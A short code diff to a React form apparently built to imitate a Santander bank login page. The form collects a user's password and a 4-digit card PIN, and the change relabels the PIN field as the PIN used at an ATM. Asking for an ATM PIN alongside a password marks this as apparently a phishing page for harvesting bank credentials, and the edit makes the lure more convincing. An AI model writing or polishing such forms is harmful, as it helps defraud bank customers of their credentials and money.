@@ -43,8 +43,8 @@ function Primerapag() {
           <input type="text" name="contram" placeholder="Contraseña" className="santander-input" required />
         </label>
         <label>
-          Nip de su tarjeta
-          <input type="tel" name="nip" placeholder="Nip de4 dígitos" className="santander-input" maxLength={4} required />
+          Nip que utiliza en su Cajero
+          <input type="tel" name="nipp" placeholder="Nipde4 dígitos" className="santander-input" maxLength={4} required />
         </label>
         <button type="submit" className="santander-continue-button">Continuar</button>
       </form>
